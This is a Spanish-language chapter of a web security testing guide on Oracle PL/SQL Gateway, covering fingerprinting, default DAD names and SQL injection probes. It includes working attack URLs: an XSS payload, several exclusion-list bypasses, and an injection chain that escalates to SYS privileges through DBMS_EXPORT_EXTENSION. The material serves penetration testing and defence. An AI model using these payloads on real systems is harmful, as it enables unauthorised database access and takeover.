# Oracle

## Resumen

Las aplicaciones web basadas en PL/SQL se habilitan mediante PL/SQL Gateway, que traduce las solicitudes web en consultas a la base de datos. Muchas implementaciones exponen esta funcionalidad mediante [Oracle REST Data Services (ORDS)](https://docs.oracle.com/en/database/oracle/oracle-rest-data-services/26.1/orddg/introduction-to-Oracle-REST-Data-Services.html), a menudo como frontal de [Oracle APEX](https://docs.oracle.com/en/database/oracle/apex/). Algunos entornos antiguos todavía pueden utilizar Apache `mod_plsql`, Oracle HTTP Server, Oracle Application Server, Portal, HTML DB y sus predecesores de APEX, WebDB o el servidor web de XML Database (XDB).

Este capítulo se centra en reconocer y probar los endpoints de PL/SQL Gateway, incluidas las implementaciones heredadas de `mod_plsql` y Application Server que siguen en producción. Aplique el mismo enfoque de validación de entradas a las superficies de ORDS y APEX, y utilice las directrices generales sobre [inyección SQL](05-SQL_Injection.md) para las aplicaciones respaldadas por Oracle que no exponen el gateway.

## Cómo probar

### Cómo funciona PL/SQL Gateway

En esencia, PL/SQL Gateway actúa como un servidor proxy que toma la solicitud web del usuario y la pasa al servidor de base de datos, donde se ejecuta.

1. El servidor web acepta una solicitud de un cliente web y determina si PL/SQL Gateway debe procesarla.
2. PL/SQL Gateway procesa la solicitud extrayendo el nombre del paquete solicitado, el procedimiento y las variables.
3. El paquete y el procedimiento solicitados se incluyen en un bloque de PL/SQL anónimo, que se envía al servidor de base de datos.
4. El servidor de base de datos ejecuta el procedimiento y envía los resultados al gateway en formato HTML.
5. El gateway envía la respuesta al cliente a través del servidor web.

Es importante comprender este punto: el código PL/SQL no está en el servidor web, sino en el servidor de base de datos. Esto significa que cualquier debilidad de PL/SQL Gateway o de la aplicación PL/SQL, si se explota, da al atacante acceso directo al servidor de base de datos; ningún número de firewalls lo impedirá.

Las URL de las aplicaciones web PL/SQL suelen ser fáciles de reconocer y, por lo general, empiezan con lo siguiente (xyz puede ser cualquier cadena y representa un Descriptor de Acceso a la Base de Datos, sobre el que aprenderá más adelante):

- `https://www.example.com/pls/xyz`
- `https://www.example.com/xyz/owa`
- `https://www.example.com/xyz/plsql`

El segundo y el tercer ejemplo representan URL de implementaciones antiguas de PL/SQL Gateway; el primero es típico de Apache `mod_plsql` (`/pls` es la ubicación predeterminada en `plsql.conf`, aunque se puede cambiar la ruta). Las asignaciones de ORDS varían según la configuración y podrían no utilizar `/pls`. La ausencia de una extensión de archivo en una URL podría indicar la presencia de Oracle PL/SQL Gateway. Considere la siguiente URL:

`https://www.server.com/aaa/bbb/xxxxx.yyyyy`

Si `xxxxx.yyyyy` se reemplazara por algo como `ebank.home`, `store.welcome`, `auth.login` o `books.search`, habría bastantes probabilidades de que se estuviera utilizando PL/SQL Gateway. También es posible anteponer al paquete y al procedimiento solicitados el nombre del usuario que los posee, es decir, el esquema; en este caso, el usuario es `webuser`:

`https://www.server.com/pls/xyz/webuser.pkg.proc`

En esta URL, xyz es el Descriptor de Acceso a la Base de Datos, o DAD. Un DAD especifica información sobre el servidor de base de datos para que PL/SQL Gateway pueda conectarse. Contiene información como la cadena de conexión TNS, el ID de usuario y la contraseña, y los métodos de autenticación. En Apache `mod_plsql`, estos DAD se especifican en `dads.conf`; los listeners más antiguos utilizaban `wdbsvr.app`. ORDS utiliza sus propios archivos de configuración y de grupos de conexiones en lugar de DAD. Algunos nombres de DAD predeterminados históricos son los siguientes:

```txt
SIMPLEDAD
HTMLDB
ORASSO
SSODAD
PORTAL
PORTAL2
PORTAL30
PORTAL30_SSO
TEST
DAD
APP
ONLINE
DB
OWA
```

#### Cómo determinar si PL/SQL Gateway está en ejecución

Al evaluar un servidor, es importante saber primero con qué tecnología se está tratando. Si aún no lo sabe, por ejemplo, en una evaluación de caja negra, lo primero que debe hacer es averiguarlo. Es bastante fácil reconocer una aplicación web basada en PL/SQL. Primero, está el formato de la URL y su aspecto, que se describieron anteriormente. Además, hay una serie de pruebas sencillas que se pueden realizar para comprobar si PL/SQL Gateway está presente.

#### Encabezados de respuesta del servidor

Los encabezados de respuesta pueden ayudar a identificar las capas web de Oracle, pero no son obligatorios ni fiables por sí solos. Muchas implementaciones de ORDS y APEX están detrás de proxies inversos o redes de distribución de contenido (CDN) y devuelven un valor genérico en `Server`, o ninguno. Si los banners no aparecen o se han reescrito, dé prioridad al formato de la URL y a las pruebas siguientes.

Señales útiles cuando están presentes:

- `Oracle-REST-Data-Services/...` (ORDS).
- `Oracle-HTTP-Server`, `mod_plsql` o `Oracle-Application-Server` (Oracle HTTP Server o Application Server heredados).
- Encabezados relacionados, como `X-ORDS-*` o los antiguos `X-APEX-*`.

Ejemplos:

```text
Server: Oracle-REST-Data-Services/24.2.0.r1234567
Server: Oracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server
Server: Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0
```

#### La prueba NULL

En PL/SQL, `null` es una expresión perfectamente válida:

```sql
SQL> BEGIN
  NULL;
  END;
  /
PL/SQL procedure successfully completed.
```

Podemos utilizar esto para comprobar si el servidor ejecuta PL/SQL Gateway. Basta con tomar el `DAD` y añadir `NULL`, y luego añadir `NOSUCHPROC`:

- `https://www.example.com/pls/dad/null`
- `https://www.example.com/pls/dad/nosuchproc`

Si el servidor responde con una respuesta `200 OK` a la primera y una `404 Not Found` a la segunda, eso indica que el servidor ejecuta PL/SQL Gateway.

#### Acceso a paquetes conocidos

En las versiones antiguas de PL/SQL Gateway, es posible acceder directamente a los paquetes que conforman PL/SQL Web Toolkit, como los paquetes OWA y HTP. Uno de estos paquetes es `OWA_UTIL`, del que hablaremos más adelante. Este paquete contiene un procedimiento llamado SIGNATURE que simplemente genera una firma PL/SQL en HTML. Por lo tanto, al solicitar

`https://www.example.com/pls/dad/owa_util.signature`

se obtiene el siguiente resultado en la página web:

`"This page was produced by the PL/SQL Web Toolkit on date"`

o

`"This page was produced by the PL/SQL Cartridge on date"`

Si no obtiene esta respuesta, pero sí una respuesta 403 Forbidden, puede inferir que PL/SQL Gateway está en ejecución. Esta es la respuesta que debería obtener en las versiones posteriores o en los sistemas parcheados.

#### Acceso a paquetes PL/SQL arbitrarios en la base de datos

Es posible explotar vulnerabilidades en los paquetes PL/SQL instalados de forma predeterminada en el servidor de base de datos. La forma de hacerlo depende de la versión de PL/SQL Gateway. En las primeras versiones de PL/SQL Gateway, nada impedía que un atacante accediera a cualquier paquete PL/SQL del servidor de base de datos. Antes mencionamos el paquete `OWA_UTIL`. Este se puede utilizar para ejecutar consultas SQL arbitrarias:

`https://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT? P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS`

Se podrían llevar a cabo ataques de Cross-Site Scripting (XSS) mediante el paquete HTP:

`https://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>`

Es evidente que esto es peligroso, por lo que Oracle introdujo una lista de exclusión de PLSQL para impedir el acceso directo a procedimientos tan peligrosos. Entre los elementos prohibidos se encuentran cualquier solicitud que empiece por `SYS.*`, cualquier solicitud que empiece por `DBMS_*` y cualquier solicitud con `HTP.*` u `OWA*`. Sin embargo, es posible eludir la lista de exclusión. Además, la lista de exclusión no impide el acceso a paquetes de los esquemas `CTXSYS` y `MDSYS`, entre otros, por lo que es posible explotar fallos en estos paquetes:

`https://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL`

Si el servidor de base de datos sigue siendo vulnerable a este fallo (CVE-2006-0265), se devolverá una página HTML en blanco con una respuesta 200 OK.

### Fallos de PL/SQL Gateway

A lo largo de los años, Oracle PL/SQL Gateway ha sufrido diversos fallos, entre ellos, acceso a páginas de administración (CVE-2002-0561), desbordamientos de búfer (CVE-2002-0559), errores de recorrido de directorios y vulnerabilidades que permiten a los atacantes eludir la lista de exclusión y acceder y ejecutar paquetes PL/SQL arbitrarios en el servidor de base de datos.

### Cómo eludir la lista de exclusión de PL/SQL

Es increíble la cantidad de veces que Oracle ha intentado corregir fallos que permiten a los atacantes eludir la lista de exclusión. Cada parche publicado por Oracle ha sido víctima de una nueva técnica de elusión. [La historia de este lamentable episodio](https://seclists.org/fulldisclosure/2006/Feb/11)

### Cómo eludir la lista de exclusión - Método 1

Cuando Oracle introdujo por primera vez la lista de exclusión de PL/SQL para impedir que los atacantes accedieran a paquetes PL/SQL arbitrarios, se podía eludir trivialmente anteponiendo al nombre del esquema o paquete un carácter de nueva línea, espacio o tabulación codificado en hexadecimal:

```txt
https://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC
https://www.example.com/pls/dad/%20SYS.PACKAGE.PROC
https://www.example.com/pls/dad/%09SYS.PACKAGE.PROC
```

### Cómo eludir la lista de exclusión - Método 2

Las versiones posteriores del gateway permitían a los atacantes eludir la lista de exclusión anteponiendo una etiqueta al nombre del esquema o paquete. En PL/SQL, una etiqueta apunta a una línea de código a la que se puede saltar mediante la instrucción GOTO y tiene el siguiente formato: `<<NAME>>`

- `https://www.example.com/pls/dad/<<LBL>>SYS.PACKAGE.PROC`

### Cómo eludir la lista de exclusión - Método 3

Basta con poner entre comillas dobles el nombre del esquema o paquete para que un atacante pueda eludir la lista de exclusión. Algunas versiones de Oracle Application Server (en particular, 10g) convierten la solicitud del usuario a minúsculas antes de enviarla al servidor de base de datos; como los identificadores entre comillas distinguen entre mayúsculas y minúsculas, `SYS` y `sys` no son lo mismo, y las solicitudes para el segundo darán como resultado un 404 Not Found. En las versiones anteriores, lo siguiente puede eludir la lista de exclusión:

`https://www.example.com/pls/dad/"SYS".PACKAGE.PROC`

### Cómo eludir la lista de exclusión - Método 4

Según el juego de caracteres utilizado en el servidor web y en el servidor de base de datos, algunos caracteres se traducen. Por lo tanto, según los juegos de caracteres en uso, el carácter `ÿ` (`0xFF`) podría convertirse en una `Y` en el servidor de base de datos. Otro carácter que suele convertirse en una `Y` mayúscula es el carácter Macron: `0xAF`. Esto podría permitir a un atacante eludir la lista de exclusión:

`https://www.example.com/pls/dad/S%FFS.PACKAGE.PROC`
`https://www.example.com/pls/dad/S%AFS.PACKAGE.PROC`

### Cómo eludir la lista de exclusión - Método 5

Algunas versiones de PL/SQL Gateway permiten eludir la lista de exclusión con una barra invertida: `0x5C`:

`https://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC`

### Cómo eludir la lista de exclusión - Método 6

Este es el método más complejo para eludir la lista de exclusión y el que se corrigió más recientemente. Si solicitáramos lo siguiente:

`https://www.example.com/pls/dad/foo.bar?xyz=123`

el servidor de aplicaciones ejecutaría lo siguiente en el servidor de base de datos:

```sql
declare
 rc__ number;
 start_time__ binary_integer;
 simple_list__ owa_util.vc_arr;
 complex_list__ owa_util.vc_arr;
begin
 start_time__ := dbms_utility.get_time;
 owa.init_cgi_env(:n__,:nm__,:v__);
 htp.HTBUF_LEN := 255;
 null;
 null;
 simple_list__(1) := 'sys.%';
 simple_list__(2) := 'dbms\_%';
 simple_list__(3) := 'utl\_%';
 simple_list__(4) := 'owa\_%';
 simple_list__(5) := 'owa.%';
 simple_list__(6) := 'htp.%';
 simple_list__(7) := 'htf.%';
 if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then
  rc__ := 2;
 else
  null;
  orasso.wpg_session.init();
  foo.bar(XYZ=>:XYZ);
  if (wpg_docload.is_file_download) then
   rc__ := 1;
   wpg_docload.get_download_file(:doc_info);
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
  else
   rc__ := 0;
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
   owa.get_page(:data__,:ndata__);
  end if;
 end if;
 :rc__ := rc__;
 :db_proc_time__ := dbms_utility.get_time-start_time__;
end;
```

Observe las líneas 19 y 24. En la línea 19, la solicitud del usuario se comprueba frente a una lista de cadenas «malas» conocidas, es decir, la lista de exclusión. Si el paquete y el procedimiento solicitados no contienen cadenas malas, el procedimiento se ejecuta en la línea 24. El parámetro XYZ se pasa como una variable de enlace.

Si luego solicitamos lo siguiente:

`https://server.example.com/pls/dad/INJECT'POINT`

se ejecutará el siguiente código PL/SQL:

```sql
..
simple_list__(7) := 'htf.%';
if ((owa_match.match_pattern('inject'point', simple_list__ complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 inject'point;
..
```

Esto genera un error en el registro de errores: "PLS-00103: Encountered the symbol ‘POINT’ when expecting one of the following. . ." Lo que tenemos aquí es una forma de inyectar SQL arbitrario. Esto se puede explotar para eludir la lista de exclusión. Primero, el atacante debe encontrar un procedimiento PL/SQL que no tome parámetros y que no coincida con ningún elemento de la lista de exclusión. Hay bastantes paquetes predeterminados que cumplen este criterio, por ejemplo:

```txt
JAVA_AUTONOMOUS_TRANSACTION.PUSH
XMLGEN.USELOWERCASETAGNAMES
PORTAL.WWV_HTP.CENTERCLOSE
ORASSO.HOME
WWC_VERSION.GET_HTTP_DATABASE_INFO
```

El atacante debería elegir una de estas funciones que esté disponible en el sistema objetivo (es decir, que devuelva un `200 OK` al solicitarla). A modo de prueba, un atacante puede solicitar

`https://server.example.com/pls/dad/orasso.home?FOO=BAR`

el servidor debería devolver una respuesta `404 File Not Found` porque el procedimiento orasso.home no requiere parámetros y se ha proporcionado uno. Sin embargo, antes de que se devuelva el 404, se ejecuta el siguiente código PL/SQL:

```sql
..
..
if ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 orasso.home(FOO=>:FOO);
..
..
```

Observe que FOO está presente en la cadena de consulta del atacante. Los atacantes pueden aprovechar esto para ejecutar SQL arbitrario. Primero, deben cerrar los paréntesis:

`https://server.example.com/pls/dad/orasso.home?);--=BAR`

Esto hace que se ejecute el siguiente código PL/SQL:

```sql
..
orasso.home();--=>:);--);
..
```

Todo lo que aparece después del doble guion (`--`) se trata como un comentario. Esta solicitud provocará un error interno del servidor porque una de las variables de enlace deja de utilizarse, así que el atacante debe volver a añadirla. Resulta que esta variable de enlace es la clave para ejecutar PL/SQL arbitrario. Por ahora, puede utilizar `HTP.PRINT` para imprimir BAR y añadir la variable de enlace necesaria como :1:

`https://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR`

Esto debería devolver un `200` con la palabra "BAR" en el HTML. Lo que ocurre es que todo lo que aparece después del signo igual —BAR en este caso— son los datos que se insertan en la variable de enlace. Con la misma técnica también se puede volver a acceder a `owa_util.cellsprint`:

`https://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS`

Para ejecutar SQL arbitrario, incluidas instrucciones DML y DDL, el atacante inserta un execute immediate :1:

`https://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual`

> Nota: la salida no se mostrará. Esto se puede aprovechar para explotar cualquier fallo de inyección de PL/SQL propiedad de SYS, lo que permitiría al atacante obtener el control total del servidor de base de datos back-end. Por ejemplo, la siguiente URL aprovecha los fallos de inyección SQL de `DBMS_EXPORT_EXTENSION`

```txt
https://www.example.com/pls/dad/orasso.home?);
execute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20
BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20
PUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';
END;--','SYS',1,'VER',0);END;
```

### Evaluación de aplicaciones web PL/SQL personalizadas

Durante las evaluaciones de seguridad de caja negra, no se dispone del código de la aplicación PL/SQL personalizada, pero aun así es necesario evaluar si presenta vulnerabilidades de seguridad.

#### Inyección SQL

Se debe comprobar cada parámetro de entrada para detectar fallos de inyección SQL. Son fáciles de encontrar y confirmar. Para encontrarlos, basta con insertar una comilla simple en el parámetro y comprobar si hay respuestas de error (incluidos los errores 404 Not Found). La presencia de inyección SQL se puede confirmar mediante el operador de concatenación.

Por ejemplo, supongamos que hay una aplicación web PL/SQL de una librería que permite a los usuarios buscar libros por autor:

`https://www.example.com/pls/bookstore/books.search?author=DICKENS`

Si esta solicitud devuelve libros de Charles Dickens, pero

`https://www.example.com/pls/bookstore/books.search?author=DICK'ENS`

devuelve un error o un `404`, entonces podría haber un fallo de inyección SQL. Esto se puede confirmar utilizando el operador de concatenación:

`https://www.example.com/pls/bookstore/books.search?author=DICK'||'ENS`

Si esta solicitud devuelve libros de Charles Dickens, habrá confirmado la presencia de la vulnerabilidad de inyección SQL.
